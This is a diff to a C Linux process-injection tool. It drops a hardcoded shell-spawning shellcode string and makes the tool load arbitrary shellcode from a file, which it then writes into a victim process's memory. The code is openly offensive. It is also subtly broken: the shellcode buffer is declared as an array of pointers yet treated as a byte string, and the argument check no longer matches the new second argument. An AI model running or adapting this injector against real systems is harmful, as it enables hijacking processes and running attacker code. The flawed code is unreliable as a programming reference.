@@ -14,11 +14,7 @@
 
 // Thanks to https://github.com/W3ndige/linux-process-injection
 
-const char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96"
-                        "\x91\xd0\x8c\x97\xff\x48\xf7"
-                        "\xdb\x53\x54\x5f\x99\x52\x57"
-                        "\x54\x5e\xb0\x3b\x0f\x05";
-
+const char* shellcode[1024];
 
 int get_proc_pid_max() {
     FILE *pid_max_file = fopen("/proc/sys/kernel/pid_max", "r");
@@ -150,13 +146,16 @@ long parse_maps_file(long victim_pid) {
 
 int main(int argc, const char *argv[]) {
     if (argc < 2) {
-        fprintf(stderr, "Usage:\n\t./inject PID\n\n"
+        fprintf(stderr, "Usage:\n\t./inject PID shellcode.bin\n\n"
                 "\tPID - PID of the process to inject code.\n");
         exit(EXIT_FAILURE);
     }
 
-    long pid_max = get_proc_pid_max();
     long victim_pid = strtol(argv[1], (char **) NULL, 10);
+    FILE* f = fopen(argv[2], "rb");
+    fread(shellcode, 1024, 1, f);
+    fclose(f);
+    long pid_max = get_proc_pid_max();
 
     if (victim_pid == 0 || victim_pid > pid_max) {
         fprintf(stderr, "Argument not a valid number. Aborting.\n");
@@ -182,8 +181,8 @@ int main(int argc, const char *argv[]) {
 
     long address = parse_maps_file(victim_pid);
     
-    size_t payload_size = strlen(SHELLCODE);
-    uint64_t *payload = (uint64_t *)SHELLCODE;
+    size_t payload_size = strlen(shellcode);
+    uint64_t *payload = (uint64_t *)shellcode;
 
     fprintf(stdout, "[*] Injecting payload at address 0x%lx.\n", address);
     for (size_t i = 0; i < payload_size; i += 8, payload++) {
